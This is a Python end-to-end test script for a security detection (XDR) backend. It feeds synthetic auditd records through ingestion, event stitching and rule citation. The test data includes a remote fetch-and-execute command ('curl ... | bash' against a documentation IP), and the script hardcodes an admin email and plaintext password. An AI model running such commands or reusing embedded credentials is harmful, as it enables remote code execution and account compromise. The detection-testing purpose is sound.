#!/usr/bin/env python3
"""D4 · live end-to-end proof over real HTTP (PREVIEW ONLY).

Proves the chain the owner asked for:

  auditd records -> ingest -> D4 stitching -> ONE canonical event
  -> rule evaluation -> D8 citation -> canonical field -> original record

TEST DATA, clearly labelled: tenant `t-d4-proof`, collector
`d4-proof-collector`. The EXECVE line is the same verbatim auditd line
already present in stored canonical evidence from the earlier acceptance
run. Nothing is sent to production.
"""
from __future__ import annotations

import json
import os
import sys
import time
import urllib.error
import urllib.request

from dotenv import load_dotenv

load_dotenv("/app/backend/.env")
load_dotenv("/app/frontend/.env")
BASE = os.environ["REACT_APP_BACKEND_URL"].rstrip("/")
UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/126.0"
TENANT = "t-d4-proof"
AUD = f"1757452888.555:{9000 + int(time.time()) % 900}"

SYSCALL = (f'type=SYSCALL msg=audit({AUD}): arch=c000003e syscall=59 '
           f'success=yes exit=0 ppid=1234 pid=5678 auid=1000 uid=0 euid=0 '
           f'comm="bash" exe="/usr/bin/bash" key="exec"')
EXECVE = (f'type=EXECVE msg=audit({AUD}): argc=3 a0="/bin/bash" a1="-c" '
          f'a2="curl -s http://198.51.100.9/x.sh | bash"')
PROCTITLE = (f'type=PROCTITLE msg=audit({AUD}): '
             f'proctitle=2F62696E2F62617368002D63')

ok = True


def check(label, cond, detail=""):
    global ok
    ok = ok and bool(cond)
    print(f"  [{'PASS' if cond else 'FAIL'}] {label}"
          + (f" — {detail}" if detail else ""))


def call(path, method="GET", token=None, key=None, tenant=None, body=None):
    h = {"User-Agent": UA, "Content-Type": "application/json"}
    if token:
        h["Authorization"] = f"Bearer {token}"
    if key:
        h["X-XDR-API-Key"] = key
    if tenant:
        h["X-Tenant-Id"] = tenant
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(BASE + path, data=data, headers=h,
                               method=method)
    try:
        with urllib.request.urlopen(r, timeout=45) as resp:
            return resp.status, json.loads(resp.read() or b"{}")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:300]


def main() -> int:
    code, body = call("/api/auth/login", "POST", body={
        "email": "admin@nivxray.com",
        "password": "uulVDp5cCSB3Hva99s7UUAwK"})
    if code != 200:
        print(f"login failed: {code} {body}")
        return 1
    token = body.get("access_token")
    print("login: 200\n")

    # ── provision a TEST collector + key in PREVIEW ──────────────────
    print("1 · provision test collector + ingest key (preview, TEST tenant)")
    code, body = call("/api/xdr/collectors", "POST", token=token,
                      tenant=TENANT, body={
                          "name": "d4-proof-collector",
                          "protocol": "syslog",
                          "authorized_sources": ["linux-auditd"],
                          "tenant_id": TENANT,
                          "confirm_tenant_id": TENANT,
                          "allow_new_tenant": True})
    if code == 409:
        # Re-run: reuse the existing test collector rather than creating a
        # second one with the same name.
        _, lst = call("/api/xdr/collectors", token=token, tenant=TENANT)
        col_id = next((c["id"] for c in
                       ((lst.get("data") or {}).get("collectors") or [])
                       if c.get("name") == "d4-proof-collector"), None)
        print("  reusing existing test collector")
    elif code not in (200, 201):
        print(f"  collector create -> {code} {body}")
        return 1
    else:
        col = (body.get("data") or body)
        col_id = col.get("id") or (col.get("collector") or {}).get("id")
    check("collector created", bool(col_id), col_id)
    if col_id:
        call(f"/api/xdr/collectors/{col_id}", "PUT", token=token,
             tenant=TENANT, body={"authorized_sources": ["linux-auditd"]})

    code, body = call("/api/xdr/api-keys", "POST", token=token,
                      tenant=TENANT, body={
                          "name": f"d4-proof-key-{int(time.time())}",
                          "confirm_tenant_id": TENANT,
                          "allow_new_tenant": True,
                          "scopes": ["collectors.enroll", "collectors.read"]})
    if code not in (200, 201):
        print(f"  key create -> {code} {body}")
        return 1
    _d = body.get("data") or {}
    key = (_d.get("api_key") or _d.get("key") or _d.get("secret")
           or _d.get("plaintext") or _d.get("token") or _d.get("value")
           or body.get("api_key"))
    check("ingest key minted (value not printed)", bool(key))
    if not key:
        print(f"  unexpected key payload: {json.dumps(body)[:200]}")
        return 1

    # ── ingest the three records of ONE execution ────────────────────
    print("\n2 · POST the three auditd records of ONE execution")
    envs = [{"tenant_id": TENANT, "collector_id": col_id,
             "source_event_id": f"auditd:{AUD}:{name}",
             "collection_method": "syslog", "source": "d4-proof-host",
             "declared_source": "linux-auditd",
             "raw": {"line": line, "payload_format": "auditd"}}
            for name, line in (("syscall", SYSCALL), ("execve", EXECVE),
                               ("proctitle", PROCTITLE))]
    code, body = call("/api/xdr/ingest/telemetry", "POST", key=key,
                      tenant=TENANT, body={"envelopes": envs})
    check("ingest accepted", code == 200, f"HTTP {code}")
    if code != 200:
        print(f"  {body}")
        return 1
    data = body.get("data") or body
    reasoning = data.get("reasoning") if isinstance(data, dict) else None
    if isinstance(reasoning, dict):
        outcomes = reasoning.get("outcomes") or []
    elif isinstance(reasoning, list):
        outcomes = reasoning
    elif isinstance(data, dict):
        outcomes = data.get("outcomes") or []
    else:
        outcomes = data if isinstance(data, list) else []
    statuses = [o.get("status") for o in outcomes]
    print(f"  outcomes: {statuses}")
    check("every record settled exactly once", len(outcomes) == 3,
          f"{len(outcomes)} outcomes")
    check("two records STITCHED_INTO",
          statuses.count("STITCHED_INTO") == 2, str(statuses))
    members = [o for o in outcomes if o.get("status") == "STITCHED_INTO"]
    for m in members:
        check(f"member {m.get('stitch_record_type')} references the primary",
              m.get("stitched_into_source_event_id")
              == f"auditd:{AUD}:syscall"
              and m.get("stitch_audit_id") == AUD)

    # ── ONE canonical event ──────────────────────────────────────────
    print("\n3 · exactly ONE canonical event for the execution")
    time.sleep(2)
    from pymongo import MongoClient
    db = MongoClient(os.environ["MONGO_URL"])[os.environ["DB_NAME"]]
    # Scope to THIS audit identity: earlier proof runs legitimately left
    # their own events in the test tenant.
    evs = list(db.xdr_canonical_evidence.find(
        {"tenant_id": TENANT, "source_event_id": AUD}))
    check("one canonical event for this execution, not three",
          len(evs) == 1, f"{len(evs)} found for audit id {AUD}")
    if not evs:
        return 1
    ev = evs[0]
    add = ev.get("additional_fields") or {}
    print(f"  event_id     : {ev['event_id']}")
    print(f"  event_type   : {ev['event_type']}")
    print(f"  command_line : {ev['process']['command_line']}")
    print(f"  privileged   : {ev['identity']['is_privileged']}")
    print(f"  pid/ppid     : {ev['process']['pid']}/{ev['process']['ppid']}")
    print(f"  completeness : {add.get('stitch_completeness')} "
          f"records={add.get('stitch_record_types')}")

    check("deterministic stitched identity",
          ev["event_id"].startswith("cev_auditd_"), ev["event_id"])
    check("classified as an execution",
          ev["event_type"] == "process_execution")
    check("privilege AND real command line on the SAME event",
          ev["identity"]["is_privileged"] is True
          and "curl -s http://198.51.100.9/x.sh | bash"
          in ev["process"]["command_line"])
    check("identity attributed to SYSCALL",
          add.get("identity_source_record") == "SYSCALL")
    check("command line attributed to EXECVE",
          add.get("command_line_source_record") == "EXECVE")
    check("all three raw records preserved",
          len(ev.get("evidence_refs") or []) == 3,
          str(len(ev.get("evidence_refs") or [])))
    check("group reported COMPLETE",
          add.get("stitch_completeness") == "COMPLETE")

    # ── D8 citation on the stitched event ────────────────────────────
    print("\n4 · D8 citation read back through the read-only endpoint")
    code, body = call(
        f"/api/xdr/detections/{ev['event_id']}/citations?tenant={TENANT}",
        token=token)
    check("citations endpoint 200", code == 200, f"HTTP {code} {str(body)[:120]}")
    if code != 200:
        return 1
    cits = (body.get("data") or {}).get("citations") or []
    check("a citation exists for the stitched event", bool(cits))
    if not cits:
        return 1
    c = cits[0]
    print(f"  rule         : {c['rule_id']} v{c['rule_version']}")
    for cond in c["evaluated_conditions"]:
        print(f"    [{cond['result']:10s}] {cond['canonical_field']:22s} "
              f"observed={str(cond['observed_value'])[:46]!r}")
    matched = [x for x in c["evaluated_conditions"]
               if x["result"] == "MATCH"]
    check("citation cites the stitched command line",
          any("curl -s http://198.51.100.9/x.sh | bash"
              in str(x["observed_value"]) for x in matched))
    check("evidence_ref points at the stitched canonical event",
          c["evidence_ref"].endswith(ev["event_id"]))

    # ── the full drill-down the owner asked for ──────────────────────
    print("\n5 · drill-down: detection -> citation -> field -> record")
    src = add.get("stitch_canonical_attribution", {}).get("process.argv")
    execve_raw = next((r for r in ev["evidence_refs"]
                       if r["record_type"] == "EXECVE"), None)
    check("cited value traces to the EXECVE record", src == "EXECVE")
    check("the original EXECVE line is recoverable verbatim",
          execve_raw and execve_raw["line"] == EXECVE)
    if execve_raw:
        print(f"    original record: {execve_raw['line'][:90]}…")

    # ── cleanup: revoke the test key ─────────────────────────────────
    print("\n6 · cleanup")
    kid = ((body if isinstance(body, dict) else {}).get("data") or {})
    code, kb = call("/api/xdr/api-keys", token=token, tenant=TENANT)
    for k in ((kb.get("data") or {}).get("api_keys") or []):
        if str(k.get("name","")).startswith("d4-proof-key") and k.get("enabled"):
            code, _ = call(f"/api/xdr/api-keys/{k['id']}/revoke", "POST",
                           token=token, tenant=TENANT)
            check("test ingest key revoked", code == 200, f"HTTP {code}")

    print(f"\n{'ALL CHECKS PASSED' if ok else 'FAILURES PRESENT'}")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
